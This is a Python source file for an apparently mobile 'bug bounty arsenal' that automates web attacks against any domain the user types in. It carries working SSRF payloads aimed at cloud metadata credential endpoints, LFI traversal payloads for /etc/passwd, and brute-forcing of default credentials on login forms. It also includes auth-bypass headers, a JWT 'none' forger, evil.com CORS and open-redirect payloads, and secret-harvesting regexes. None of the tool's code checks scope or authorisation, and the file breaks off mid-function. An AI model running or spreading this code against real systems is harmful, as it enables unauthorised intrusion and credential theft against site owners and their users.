#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║     TERMUX BUG BOUNTY ARSENAL v5.0 by Mrbead93               ║
║     Unrooted Android | Semi-Automated | Professional         ║
╚══════════════════════════════════════════════════════════════╝
"""

import os, sys, subprocess, datetime, time, threading
import re, json, base64
import requests
from bs4 import BeautifulSoup
from colorama import Fore, Back, Style, init
init(autoreset=True)

# ════════════════════════════════════════════════════════════
#  PATHS
# ════════════════════════════════════════════════════════════
HOME        = os.path.expanduser("~")
PROJECTS    = os.path.join(HOME, "projects")
ARSENAL_DIR = os.path.dirname(os.path.abspath(__file__))
XSSTRIKE    = os.path.join(PROJECTS, "xsstrike", "xsstrike.py")

last_target = "None set"

# ════════════════════════════════════════════════════════════
#  CONSTANTS
# ════════════════════════════════════════════════════════════
SECRET_PATTERNS = {
    "AWS Access Key":  r"AKIA[0-9A-Z]{16}",
    "AWS Secret Key":  r"(?i)aws(.{0,20})?['\"][0-9a-zA-Z\/+]{40}['\"]",
    "Google API Key":  r"AIza[0-9A-Za-z\-_]{35}",
    "GitHub Token":    r"ghp_[0-9a-zA-Z]{36}",
    "Slack Token":     r"xox[baprs]-([0-9a-zA-Z]{10,48})",
    "Stripe Key":      r"(?:r|s)k_live_[0-9a-zA-Z]{24}",
    "JWT Token":       r"eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*",
    "Private Key":     r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----",
    "Password in JS":  r"(?i)(password|passwd|pwd)\s*[:=]\s*['\"][^'\"]{4,}['\"]",
    "API Key Generic": r"(?i)(api_key|apikey|api-key)\s*[:=]\s*['\"][^'\"]{8,}['\"]",
    "Bearer Token":    r"(?i)bearer\s+[a-zA-Z0-9\-._~+/]+=*",
    "Firebase URL":    r"https://[a-z0-9-]+\.firebaseio\.com",
    "Secret Generic":  r"(?i)(secret|token)\s*[:=]\s*['\"][^'\"]{8,}['\"]",
}

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://localhost:22/",
    "http://localhost:3306/",
    "file:///etc/passwd",
]

LFI_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "php://filter/convert.base64-encode/resource=index.php",
]

CORS_ORIGINS = [
    "https://evil.com",
    "null",
    "http://localhost",
]

API_WORDLIST = [
    "/api", "/api/v1", "/api/v2", "/api/v3",
    "/api/users", "/api/user", "/api/admin",
    "/api/login", "/api/auth", "/api/token",
    "/api/config", "/api/settings", "/api/debug",
    "/api/health", "/api/status", "/api/info",
    "/swagger.json", "/openapi.json", "/api-docs",
    "/graphql", "/v1", "/v2", "/rest",
    "/.well-known/openid-configuration",
]

SENSITIVE_FILES = [
    "/.git/config", "/.env", "/.env.local",
    "/.env.production", "/config.php", "/wp-config.php",
    "/config.yml", "/.htaccess", "/phpinfo.php",
    "/server-status", "/actuator/env", "/actuator/mappings",
    "/debug", "/.DS_Store", "/backup.zip",
    "/backup.sql", "/robots.txt", "/sitemap.xml",
]

TAKEOVER_FINGERPRINTS = {
    "GitHub Pages": "There isn't a GitHub Pages site here",
    "Heroku":       "No such app",
    "Shopify":      "Sorry, this shop is currently unavailable",
    "Fastly":       "Fastly error: unknown domain",
    "Surge.sh":     "project not found",
    "Tumblr":       "Whatever you were looking for doesn't live here",
    "Zendesk":      "Help Center Closed",
    "S3 Bucket":    "NoSuchBucket",
}


# ════════════════════════════════════════════════════════════
#  UI HELPERS
# ════════════════════════════════════════════════════════════

def banner():
    os.system("clear")
    print(Fore.CYAN + Style.BRIGHT + """
╔══════════════════════════════════════════════════════════════╗
║       TERMUX BUG BOUNTY ARSENAL  v5.0                        ║
║       ULTIMATE UNROOTED MOBILE BUG BOUNTY TOOLKIT            ║
║       Recon | Vulns | API | JS | Auth | Misconfig            ║
╚══════════════════════════════════════════════════════════════╝""")
    print(Fore.YELLOW + f"  Target: {Fore.WHITE}{last_target}")
    print(Fore.YELLOW + f"  Time:   {Fore.WHITE}{datetime.datetime.now().strftime('%Y-%m-%d %H:%M')}")
    print(Fore.CYAN + "  " + "─" * 60 + "\n")


def print_header(title):
    print(Fore.CYAN + Style.BRIGHT + f"\n╔══ {title} ══╗")


def ok(msg):
    print(Fore.GREEN + f"  [✓] {msg}")


def warn(msg):
    print(Fore.YELLOW + f"  [!] {msg}")


def err(msg):
    print(Fore.RED + f"  [✗] {msg}")


def info(msg):
    print(Fore.CYAN + f"  [→] {msg}")


def dim(msg):
    print(Style.DIM + f"      {msg}")


def found(msg):
    print(Fore.RED + Style.BRIGHT + f"  [FOUND] {msg}")


def section(title):
    print(Fore.CYAN + f"\n  ── {title} {'─' * (50 - len(title))}")


def progress_bar(stop_event, message, total_time=60):
    spinner = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
    bar_len = 30
    i       = 0
    start   = time.time()
    while not stop_event.is_set():
        elapsed  = time.time() - start
        progress = min(elapsed / total_time, 0.99)
        filled   = int(bar_len * progress)
        bar      = '█' * filled + '░' * (bar_len - filled)
        percent  = int(progress * 100)
        spin     = spinner[i % len(spinner)]
        sys.stdout.write(
            f"\r  {Fore.CYAN}{spin}{Style.RESET_ALL} "
            f"{Fore.WHITE}{message[:30]:<30}{Style.RESET_ALL} "
            f"{Fore.CYAN}[{bar}]{Style.RESET_ALL} "
            f"{Fore.YELLOW}{percent:>3}%{Style.RESET_ALL}"
        )
        sys.stdout.flush()
        time.sleep(0.1)
        i += 1
    bar = '█' * bar_len
    sys.stdout.write(
        f"\r  {Fore.GREEN}✓{Style.RESET_ALL} "
        f"{Fore.WHITE}{message[:30]:<30}{Style.RESET_ALL} "
        f"{Fore.GREEN}[{bar}]{Style.RESET_ALL} "
        f"{Fore.GREEN}100%{Style.RESET_ALL}\n"
    )
    sys.stdout.flush()


def run_cmd(cmd, description, estimated_seconds=60, long_running=False):
    if long_running:
        warn(f"This step may take 5-25 minutes: {description}")
    stop_event = threading.Event()
    thread     = threading.Thread(
        target=progress_bar,
        args=(stop_event, description, estimated_seconds)
    )
    thread.start()
    try:
        result = subprocess.run(
            cmd, shell=True, text=True, capture_output=True
        )
        stop_event.set()
        thread.join()
        if result.returncode != 0 and result.stderr:
            dim(f"stderr: {result.stderr[:100]}")
        return result.stdout
    except Exception as e:
        stop_event.set()
        thread.join()
        err(f"Command failed: {e}")
        return ""


def check_tool(name):
    return subprocess.run(
        f"which {name}", shell=True, capture_output=True
    ).returncode == 0


def get_target(prompt="  Target domain (e.g. example.com): "):
    global last_target
    t = input(Fore.WHITE + prompt).strip()
    if t:
        last_target = t
    return t


def normalise_url(target):
    if target.startswith("http"):
        return target
    return f"https://{target}"


def save_findings(target, module, findings):
    out_dir = os.path.join(ARSENAL_DIR, "reports", target)
    os.makedirs(out_dir, exist_ok=True)
    path = os.path.join(out_dir, f"{module}_findings.json")
    with open(path, "w") as f:
        json.dump(findings, f, indent=2)
    ok(f"Saved → {path}")
    return path


def pause():
    input(Style.DIM + "\n  Press Enter to continue...")


# ════════════════════════════════════════════════════════════
#  MODULE 9 — VULNERABILITY SCANNER
# ════════════════════════════════════════════════════════════

def module_vuln_scanner():
    banner()
    print_header("MODULE 9 — VULNERABILITY SCANNER")
    info("Covers: XSS | SQLi | SSRF | LFI")
    print()
    target = get_target()
    if not target:
        return
    url = normalise_url(target)
    print(Fore.GREEN + """
  ┌─────────────────────────────┐
  │  1. XSS Scan  (XSStrike)    │
  │  2. SQLi Scan (sqlmap)      │
  │  3. SSRF Test               │
  │  4. LFI Test                │
  │  5. Run All                 │
  │  0. Back                    │
  └─────────────────────────────┘""")
    choice = input(Fore.WHITE + "\n  Choose → ").strip()
    if choice == "0":
        return
    out_dir = os.path.join(ARSENAL_DIR, "reports", target)
    os.makedirs(out_dir, exist_ok=True)
    findings = []

    if choice in ("1", "5"):
        section("XSS SCAN — XSStrike")
        if os.path.exists(XSSTRIKE):
            run_cmd(
                f"python3 {XSSTRIKE} -u {url} --crawl --blind",
                "XSS Scanning", 120
            )
        else:
            warn("XSStrike not found at ~/projects/xsstrike")
            info("Install: git clone https://github.com/s0md3v/XSStrike.git ~/projects/xsstrike")

    if choice in ("2", "5"):
        section("SQLI SCAN — sqlmap")
        if check_tool("sqlmap"):
            run_cmd(
                f"sqlmap -u {url} --batch --level=2 --risk=1 "
                f"--output-dir={out_dir}/sqlmap --forms --crawl=2",
                "SQLi Scanning", 180, long_running=True
            )
        else:
            warn("sqlmap not installed — run: pip install sqlmap")

    if choice in ("3", "5"):
        section("SSRF TESTING")
        param = input("  Parameter to inject (e.g. url, redirect, next): ").strip()
        if param:
            info(f"Testing {len(SSRF_PAYLOADS)} SSRF payloads on ?{param}=...")
            print()
            for i, payload in enumerate(SSRF_PAYLOADS, 1):
                test_url = f"{url}?{param}={payload}"
                try:
                    r = requests.get(
                        test_url, timeout=5,
                        allow_redirects=False,
                        headers={"User-Agent": "Mozilla/5.0"}
                    )
                    indicators = ["ami-id", "metadata", "root:", "ec2"]
                    hit = any(x in r.text.lower() for x in indicators)
                    bar = '█' * i + '░' * (len(SSRF_PAYLOADS) - i)
                    status_col = Fore.RED if hit else (
                        Fore.YELLOW if r.status_code == 200 else Style.DIM
                    )
                    sys.stdout.write(
                        f"\r  [{bar}] {i}/{len(SSRF_PAYLOADS)} "
                        f"{status_col}[{r.status_code}]{Style.RESET_ALL} "
                        f"{payload[:40]}"
                    )
                    sys.stdout.flush()
                    if hit:
                        print()
                        found(f"SSRF: {payload} → {r.status_code}")
                        findings.append({"type": "ssrf", "payload": payload,
                                         "status": r.status_code})
                except requests.exceptions.Timeout:
                    pass
                except Exception:
                    pass
            print()

    if choice in ("4", "5"):
        section("LFI TESTING")
        param = input("  Parameter to inject (e.g. file, page, path): ").strip()
        if param:
            info(f"Testing {len(LFI_PAYLOADS)} LFI payloads on ?{param}=...")
            print()
            for i, payload in enumerate(LFI_PAYLOADS, 1):
                test_url = f"{url}?{param}={payload}"
                try:
                    r = requests.get(
                        test_url, timeout=5,
                        headers={"User-Agent": "Mozilla/5.0"}
                    )
                    indicators = ["root:x:", "daemon:", "<?php", "uid="]
                    hit = any(x in r.text for x in indicators)
                    bar = '█' * i + '░' * (len(LFI_PAYLOADS) - i)
                    sys.stdout.write(
                        f"\r  [{bar}] {i}/{len(LFI_PAYLOADS)} "
                        f"{'[HIT!]' if hit else f'[{r.status_code}]'} "
                        f"{payload[:40]}"
                    )
                    sys.stdout.flush()
                    if hit:
                        print()
                        found(f"LFI CONFIRMED: {payload}")
                        findings.append({"type": "lfi", "payload": payload,
                                         "snippet": r.text[:200]})
                except requests.exceptions.Timeout:
                    pass
                except Exception:
                    pass
            print()

    if findings:
        save_findings(target, "vuln", findings)
        found(f"{len(findings)} vulnerability findings saved!")
    else:
        ok("No confirmed vulnerabilities found.")
    pause()


# ════════════════════════════════════════════════════════════
#  MODULE 10 — API HUNTER
# ════════════════════════════════════════════════════════════

def module_api_hunter():
    banner()
    print_header("MODULE 10 — API HUNTER")
    info("Discovers API endpoints, auth requirements, and doc exposure")
    print()
    target = get_target()
    if not target:
        return
    url      = normalise_url(target)
    headers  = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}
    findings = []

    section("ENDPOINT DISCOVERY")
    info(f"Testing {len(API_WORDLIST)} common API paths...")
    print()

    for i, endpoint in enumerate(API_WORDLIST, 1):
        test_url = f"{url}{endpoint}"
        bar      = '█' * i + '░' * (len(API_WORDLIST) - i)
        pct      = int(i / len(API_WORDLIST) * 100)
        try:
            r            = requests.get(test_url, timeout=5, headers=headers)
            content_type = r.headers.get("Content-Type", "")
            is_json      = "json" in content_type or r.text.strip().startswith(("{", "["))
            sys.stdout.write(
                f"\r  [{bar}] {pct}% "
                f"{Fore.CYAN}[{r.status_code}]{Style.RESET_ALL} "
                f"{endpoint:<35}"
            )
            sys.stdout.flush()
            if r.status_code in (200, 201, 401, 403, 405):
                if r.status_code in (200, 201):
                    note, col = "OPEN", Fore.RED
                elif r.status_code in (401, 403):
                    note, col = "AUTH REQUIRED", Fore.YELLOW
                else:
                    note, col = "METHOD NOT ALLOWED", Fore.YELLOW
                print(f"\n  {col}[{note}]{Style.RESET_ALL} {endpoint}"
                      f"{Fore.CYAN + ' [JSON]' + Style.RESET_ALL if is_json else ''}")
                findings.append({"endpoint": test_url, "status": r.status_code,
                                 "note": note, "json": is_json})
        except requests.exceptions.Timeout:
            pass
        except Exception:
            pass

    print()
    section("API DOC EXPOSURE CHECK")
    doc_paths = ["/swagger.json", "/openapi.json", "/api-docs",
                 "/swagger/index.html", "/.well-known/openid-configuration"]
    for path in doc_paths:
        try:
            r = requests.get(f"{url}{path}", timeout=5, headers=headers)
            if r.status_code == 200:
                found(f"API DOCS EXPOSED: {url}{path}")
                findings.append({"type": "docs_exposed", "path": path})
            else:
                dim(f"{path} → {r.status_code}")
        except Exception:
            pass

    if findings:
        save_findings(target, "api", findings)
        ok(f"{len(findings)} API findings saved.")
    else:
        ok("No API endpoints discovered.")
    pause()


# ════════════════════════════════════════════════════════════
#  MODULE 11 — JS SECRET SCANNER
# ════════════════════════════════════════════════════════════

def extract_js_urls(url, html):
    soup    = BeautifulSoup(html, "html.parser")
    js_urls = []
    base    = "/".join(url.split("/")[:3])
    for tag in soup.find_all("script", src=True):
        src = tag["src"]
        if src.startswith("http"):
            js_urls.append(src)
        elif src.startswith("//"):
            js_urls.append("https:" + src)
        elif src.startswith("/"):
            js_urls.append(base + src)
    return js_urls


def scan_js_content(content, source):
    results = []
    for secret_type, pattern in SECRET_PATTERNS.items():
        matches = re.findall(pattern, content)
        if matches:
            for match in matches[:3]:
                results.append({
                    "type":   secret_type,
                    "match":  str(match)[:100],
                    "source": source
                })
    return results


def module_js_scanner():
    banner()
    print_header("MODULE 11 — JS SECRET SCANNER")
    info("Scans JavaScript files for exposed secrets, tokens, and keys")
    print()
    target = get_target()
    if not target:
        return
    url      = normalise_url(target)
    headers  = {"User-Agent": "Mozilla/5.0"}
    findings = []

    section("FETCHING JS FILES")
    try:
        stop = threading.Event()
        t    = threading.Thread(target=progress_bar, args=(stop, "Fetching page", 5))
        t.start()
        r    = requests.get(url, timeout=10, headers=headers)
        stop.set()
        t.join()
        js_urls = extract_js_urls(url, r.text)
        ok(f"Found {len(js_urls)} external JS files")
    except Exception as e:
        err(f"Could not fetch {url}: {e}")
        pause()
        return

    section("SCANNING JS FILES")
    for i, js_url in enumerate(js_urls, 1):
        pct = int(i / max(len(js_urls), 1) * 100)
        bar = '█' * int(pct / 4) + '░' * (25 - int(pct / 4))
        sys.stdout.write(
            f"\r  [{bar}] {pct}% Scanning file {i}/{len(js_urls)}"
        )
        sys.stdout.flush()
        try:
            jr   = requests.get(js_url, timeout=8, headers=headers)
            hits = scan_js_content(jr.text, js_url)
            if hits:
                print()
                for h in hits:
                    found(f"{h['type']}: {h['match'][:60]}...")
                findings.extend(hits)
        except Exception:
            pass
    print()

    section("SCANNING INLINE SCRIPTS")
    try:
        soup           = BeautifulSoup(r.text, "html.parser")
        inline_scripts = soup.find_all("script", src=False)
        info(f"Found {len(inline_scripts)} inline scripts")
        for script in inline_scripts:
            if script.string:
                hits = scan_js_content(script.string, f"{url} [inline]")
                for h in hits:
                    found(f"{h['type']}: {h['match'][:60]}...")
                findings.extend(hits)
        ok("Inline scan complete")
    except Exception as e:
        warn(f"Inline scan error: {e}")

    if findings:
        save_findings(target, "js_secrets", findings)
        found(f"{len(findings)} secrets found! Review immediately.")
    else:
        ok("No secrets detected in JS files.")
    pause()


# ════════════════════════════════════════════════════════════
#  MODULE 12 — AUTH TESTER
# ════════════════════════════════════════════════════════════

def module_auth_tester():
    banner()
    print_header("MODULE 12 — AUTH TESTER")
    info("Tests: Default creds | Auth bypass | Session security | JWT")
    print()
    target = get_target()
    if not target:
        return
    url      = normalise_url(target)
    findings = []

    print(Fore.GREEN + """
  ┌──────────────────────────────────────┐
  │  1. Default Credential Test          │
  │  2. Auth Bypass Headers              │
  │  3. Session & Security Header Audit  │
  │  4. JWT None Algorithm Test          │
  │  5. Run All                          │
  │  0. Back                             │
  └──────────────────────────────────────┘""")
    choice = input(Fore.WHITE + "\n  Choose → ").strip()
    if choice == "0":
        return

    if choice in ("1", "5"):
        section("DEFAULT CREDENTIAL TEST")
        login_path = input("  Login path (e.g. /admin, /login): ").strip() or "/admin"
        user_field = input("  Username field (default: username): ").strip() or "username"
        pass_field = input("  Password field (default: password): ").strip() or "password"
        login_url  = f"{url}{login_path}"
        default_creds = [
            ("admin", "admin"), ("admin", "password"),
            ("admin", "123456"), ("admin", "admin123"),
            ("root", "root"), ("root", "toor"),
            ("test", "test"), ("user", "user"),
            ("administrator", "administrator"),
            ("admin", ""), ("guest", "guest"),
        ]
        info(f"Testing {len(default_creds)} credential pairs on {login_url}")
        print()
        for i, (username, password) in enumerate(default_creds, 1):
            bar = '█' * i + '░' * (len(default_creds) - i)
            try:
                r = requests.post(
                    login_url,
                    data={user_field: username, pass_field: password},
                    timeout=5, allow_redirects=True,
                    headers={"User-Agent": "Mozilla/5.0"}
                )
                body       = r.text.lower()
                is_fail    = any(x in body for x in ["invalid", "incorrect", "failed", "wrong", "error"])
                is_success = any(x in body for x in ["dashboard", "welcome", "logout", "profile"])
                sys.stdout.write(
                    f"\r  [{bar}] {i}/{len(default_creds)} "
                    f"Testing {username}:{password:<15}"
                )
                sys.stdout.flush()
                if is_success or (r.status_code == 302 and not is_fail):
                    print()
                    found(f"POSSIBLE LOGIN: {username}:{password} → {r.status_code}")
                    findings.append({"type": "default_creds",
                                     "username": username, "password": password})
            except Exception:
                pass
        print()

    if choice in ("2", "5"):
        section("AUTH BYPASS HEADER TEST")
        protected = input("  Protected path (e.g. /admin): ").strip() or "/admin"
        test_url  = f"{url}{protected}"
        bypass_headers = [
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Remote-Addr": "127.0.0.1"},
            {"X-ProxyUser-Ip": "127.0.0.1"},
        ]
        try:
            baseline = requests.get(
                test_url, timeout=5,
                headers={"User-Agent": "Mozilla/5.0"}
            ).status_code
            info(f"Baseline response: {baseline}")
        except Exception:
            baseline = 0
        for i, hdrs in enumerate(bypass_headers, 1):
            bar = '█' * i + '░' * (len(bypass_headers) - i)
            key = list(hdrs.keys())[0]
            try:
                r = requests.get(
                    test_url, timeout=5,
                    headers={**{"User-Agent": "Mozilla/5.0"}, **hdrs}
                )
                sys.stdout.write(
                    f"\r  [{bar}] {i}/{len(bypass_headers)} "
                    f"{key:<35} [{r.status_code}]"
                )
                sys.stdout.flush()
                if r.status_code == 200 and baseline != 200:
                    print()
                    found(f"BYPASS: {hdrs} → 200!")
                    findings.append({"type": "auth_bypass", "header": hdrs})
            except Exception:
                pass
        print()

    if choice in ("3", "5"):
        section("SESSION & SECURITY HEADER AUDIT")
        try:
            r = requests.get(url, timeout=10,
                             headers={"User-Agent": "Mozilla/5.0"})
            info("Cookie Analysis:")
            for cookie in r.cookies:
                issues = []
                if not cookie.secure:
                    issues.append("No Secure flag")
                if not cookie.has_nonstandard_attr("HttpOnly"):
                    issues.append("No HttpOnly flag")
                if not cookie.has_nonstandard_attr("SameSite"):
                    issues.append("No SameSite flag")
                if issues:
                    warn(f"Cookie '{cookie.name}': {', '.join(issues)}")
                    findings.append({"type": "cookie_issue",
                                     "name": cookie.name, "issues": issues})
                else:
                    ok(f"Cookie '{cookie.name}' — secure")
            info("Security Header Audit:")
            security_headers = [
                "Strict-Transport-Security",
                "X-Frame-Options",
                "X-Content-Type-Options",
                "Content-Security-Policy",
                "X-XSS-Protection",
                "Referrer-Policy",
                "Permissions-Policy",
            ]
            for header in security_headers:
                val = r.headers.get(header)
                if val:
                    ok(f"{header}: {val[:60]}")
                else:
                    warn(f"MISSING: {header}")
                    findings.append({"type": "missing_header", "header": header})
        except Exception as e:
            err(f"Error: {e}")

    if choice in ("4", "5"):
        section("JWT NONE ALGORITHM TEST")
        token = input("  Paste JWT token (or Enter to skip): ").strip()
        if token and token.count(".") == 2:
            parts = token.split(".")
            try:
                pad     = parts[1] + "=" * (4 - len(parts[1]) % 4)
                payload = json.loads(base64.b64decode(pad))
                info(f"Decoded payload: {json.dumps(payload, indent=2)}")
                h_none  = base64.b64encode(
                    b'{"alg":"none","typ":"JWT"}'
                ).decode().rstrip("=")
                forged  = f"{h_none}.{parts[1]}."
                warn(f"Forged 'none' token:\n    {forged}")
                info("If the server accepts this token, JWT none algorithm is vulnerable.")
                findings.append({"type": "jwt_none", "forged": forged[:100]})
            except Exception as e:
                err(f"Could not parse JWT: {e}")

    if findings:
        save_findings(target, "auth", findings)
        found(f"{len(findings)} auth issues saved!")
    else:
        ok("No auth issues found.")
    pause()


# ════════════════════════════════════════════════════════════
#  MODULE 13 — MISCONFIGURATION HUNTER
# ════════════════════════════════════════════════════════════

def module_misconfig_hunter():
    banner()
    print_header("MODULE 13 — MISCONFIGURATION HUNTER")
    info("Tests: CORS | Subdomain Takeover | Open Redirect | Sensitive Files")
    print()
    target = get_target()
    if not target:
        return
    url      = normalise_url(target)
    findings = []

    print(Fore.GREEN + """
  ┌──────────────────────────────────────┐
  │  1. CORS Misconfiguration            │
  │  2. Subdomain Takeover Check         │
  │  3. Open Redirect Test               │
  │  4. Sensitive File Exposure          │
  │  5. Run All                          │
  │  0. Back                             │
  └──────────────────────────────────────┘""")
    choice = input(Fore.WHITE + "\n  Choose → ").strip()
    if choice == "0":
        return

    if choice in ("1", "5"):
        section("CORS MISCONFIGURATION TEST")
        info(f"Testing {len(CORS_ORIGINS)} origins...")
        print()
        for i, origin in enumerate(CORS_ORIGINS, 1):
            bar = '█' * i + '░' * (len(CORS_ORIGINS) - i)
            try:
                r    = requests.get(
                    url, timeout=5,
                    allow_redirects=False,
                    headers={"Origin": origin, "User-Agent": "Mozilla/5.0"}
                )
                acao = r.headers.get("Access-Control-Allow-Origin", "")
                acac = r.headers.get("Access-Control-Allow-Credentials", "")
                sys.stdout.write(f"\r  [{bar}] Testing: {origin:<30}")
                sys.stdout.flush()
                if acao == origin or acao == "*":
                    print()
                    if acac.lower() == "true":
                        found(f"CRITICAL CORS: {origin} reflected + credentials!")
                        findings.append({"type": "cors_critical",
                                         "origin": origin, "credentials": True})
                    else:
                        warn(f"CORS: {origin} reflected (no credentials)")
                        findings.append({"type": "cors_moderate", "origin": origin})
            except requests.exceptions.Timeout:
                warn(f"Timeout on origin: {origin} — skipping")
            except Exception:
                pass
        print()
        ok("CORS test complete")

    if choice in ("2", "5"):
        section("SUBDOMAIN TAKEOVER CHECK")
        subdomains_file = os.path.join(
            ARSENAL_DIR, "reports", target, "subdomains.txt"
        )
        if not os.path.exists(subdomains_file):
            warn("No subdomains.txt found — run option 3 first")
        else:
            with open(subdomains_file) as f:
                subs = [l.strip() for l in f if l.strip()]
            info(f"Checking {min(len(subs), 50)} subdomains...")
            print()
            for i, sub in enumerate(subs[:50], 1):
                bar = '█' * i + '░' * (50 - i)
                sys.stdout.write(f"\r  [{bar}] {i}/50 {sub:<40}")
                sys.stdout.flush()
                try:
                    r = requests.get(
                        f"https://{sub}", timeout=5,
                        headers={"User-Agent": "Mozilla/5.0"}
                    )
                    for service, fingerprint in TAKEOVER_FINGERPRINTS.items():
                        if fingerprint.lower() in r.text.lower():
                            print()
                            found(f"TAKEOVER: {sub} → {service}")
                            findings.append({"type": "subdomain_takeover",
                                             "subdomain": sub, "service": service})
                            break
                except Exception:
                    pass
            print()

    if choice in ("3", "5"):
        section("OPEN REDIRECT TEST")
        redirect_payloads = [
            "https://evil.com", "//evil.com",
            "///evil.com", "/\\evil.com", "%2F%2Fevil.com",
        ]
        params = ["redirect", "url", "next", "return",
                  "returnUrl", "goto", "dest", "target"]
        total  = len(params) * len(redirect_payloads)
        count  = 0
        for param in params:
            for payload in redirect_payloads:
                count += 1
                bar    = '█' * int(count / total * 25) + '░' * (25 - int(count / total * 25))
                sys.stdout.write(
                    f"\r  [{bar}] {count}/{total} ?{param}={payload[:20]}"
                )
                sys.stdout.flush()
                try:
                    r = requests.get(
                        f"{url}?{param}={payload}", timeout=5,
                        allow_redirects=False,
                        headers={"User-Agent": "Mozilla/5.0"}
                    )
                    if "evil.com" in r.headers.get("Location", ""):
                        print()
                        found(f"OPEN REDIRECT: ?{param}={payload}")
                        findings.append({"type": "open_redirect",
                                         "param": param, "payload": payload})
                except Exception:
                    pass
        print()

    if choice in ("4", "5"):
        section("SENSITIVE FILE EXPOSURE")
        info(f"Checking {len(SENSITIVE_FILES)} paths...")
        print()
        for i, path in enumerate(SENSITIVE_FILES, 1):
            bar = '█' * int(i / len(SENSITIVE_FILES) * 25) + \
                  '░' * (25 - int(i / len(SENSITIVE_FILES) * 25))
            sys.stdout.write(f"\r  [{bar}] {i}/{len(SENSITIVE_FILES)} {path:<35}")
            sys.stdout.flush()
            try:
                r = requests.get(
                    f"{url}{path}", timeout=5,
                    headers={"User-Agent": "Mozilla/5.0"}
                )
                if r.status_code == 200:
                    print()
                    found(f"EXPOSED: {path} ({len(r.content)} bytes)")
                    dim(f"Preview: {r.text[:80].replace(chr(10), ' ')}")
                    findings.append({"type": "sensitive_file", "path": path,
                                     "size": len(r.content)})
                elif r.status_code == 403:
                    print()
                    warn(f"Forbidden (exists): {path}")
            except Exception:
                pass
        print()

    if findings:
        save_findings(target, "misconfig", findings)
        found(f"{len(findings)} misconfigurations found!")
    else:
        ok("No misconfigurations found.")
    pause()


# ════════════════════════════════════════════════════════════
#  MODULE 14 — EVIDENCE COLLECTOR
# ════════════════════════════════════════════════════════════

def module_evidence_collector():
    banner()
    print_header("MODULE 14 — EVIDENCE COLLECTOR")
    info("Captures headers, responses, and compiles findings summary")
    print()
    target = get_target()
    if not target:
        return
    url     = normalise_url(target)
    out_dir = os.path.join(ARSENAL_DIR, "reports", target, "evidence")
    os.makedirs(out_dir, exist_ok=True)

    print(Fore.GREEN + """
  ┌──────────────────────────────────────┐
  │  1. Capture Response Headers         │
  │  2. Capture Full Page Response       │
  │  3. Compile All Findings Summary     │
  │  0. Back                             │
  └──────────────────────────────────────┘""")
    choice = input(Fore.WHITE + "\n  Choose → ").strip()
    if choice == "0":
        return

    if choice == "1":
        section("RESPONSE HEADER CAPTURE")
        endpoints = input(
            "  Endpoints (comma separated, Enter for /): "
        ).strip() or "/"
        for ep in [e.strip() for e in endpoints.split(",")]:
            stop = threading.Event()
            t    = threading.Thread(target=progress_bar,
                                    args=(stop, f"Capturing {ep}", 5))
            t.start()
            try:
                r        = requests.get(f"{url}{ep}", timeout=10,
                                        headers={"User-Agent": "Mozilla/5.0"})
                stop.set()
                t.join()
                out_file = os.path.join(
                    out_dir, f"headers{ep.replace('/', '_')}.txt"
                )
                with open(out_file, "w") as f:
                    f.write(f"URL: {url}{ep}\nStatus: {r.status_code}\n\n")
                    f.write("=== RESPONSE HEADERS ===\n")
                    for k, v in r.headers.items():
                        f.write(f"{k}: {v}\n")
                ok(f"Saved → {out_file}")
            except Exception as e:
                stop.set()
                t.join()
                err(f"Error: {e}")

    elif choice == "2":
        section("FULL RESPONSE CAPTURE")
        ep   = input("  Endpoint (default /): ").strip() or "/"
        stop = threading.Event()
        t    = threading.Thread(target=progress_bar,
                                args=(stop, f"Capturing {ep}", 8))
        t.start()
        try:
            r        = requests.get(f"{url}{ep}", timeout=10,
                                    headers={"User-Agent": "Mozilla/5.0"})
            stop.set()
            t.join()
            out_file = os.path.join(
                out_dir, f"response{ep.replace('/', '_')}.html"
            )
            with open(out_file, "w") as f:
                f.write(r.text)
            ok(f"Saved → {out_file}")
        except Exception as e:
            stop.set()
            t.join()
            err(f"Error: {e}")

    elif choice == "3":
        section("FULL FINDINGS SUMMARY")
        findings_dir = os.path.join(ARSENAL_DIR, "reports", target)
        summary      = []
        total        = 0
        for fname in sorted(os.listdir(findings_dir)):
            if fname.endswith("_findings.json"):
                with open(os.path.join(findings_dir, fname)) as f:
                    data = json.load(f)
                module_name = fname.replace("_findings.json", "").upper()
                summary.append({"module": module_name,
                                 "count": len(data), "findings": data})
                total += len(data)
        if summary:
            ts           = datetime.datetime.now().strftime("%Y%m%d_%H%M")
            summary_file = os.path.join(findings_dir, f"SUMMARY_{ts}.json")
            with open(summary_file, "w") as f:
                json.dump(summary, f, indent=2)
            print()
            print(Fore.CYAN + Style.BRIGHT + "  ╔══ FINDINGS OVERVIEW ══╗")
            for s in summary:
                col = Fore.RED if s["count"] > 0 else Fore.GREEN
                print(f"  {col}► {s['module']:<20} {s['count']} findings")
            print(Fore.YELLOW + Style.BRIGHT + f"\n  TOTAL: {total} findings")
            ok(f"Summary → {summary_file}")
        else:
            warn("No findings files found yet.")
    pause()


# ════════════════════════════════════════════════════════════
#  RECON & CHAIN
# ════════════════════════════════════════════════════════════

def run_user_tool(tool_name, display_name):
    tool_path = os.path.join(PROJECTS, tool_name, f"{tool_name}.py")
    info(f"Launching {display_name}...")
    if os.path.exists(tool_path):
        subprocess.run(f"python3 {tool_path}", shell=True,
                       cwd=os.path.join(PROJECTS, tool_name))
    else:
        err(f"Not found: {tool_path}")


def full_automated_chain():
    global last_target
    banner()
    print_header("FULL AUTOMATED CHAIN")
    info("Runs complete recon + JS scan + CORS check + Report")
    print()
    target = get_target()
    if not target:
        return
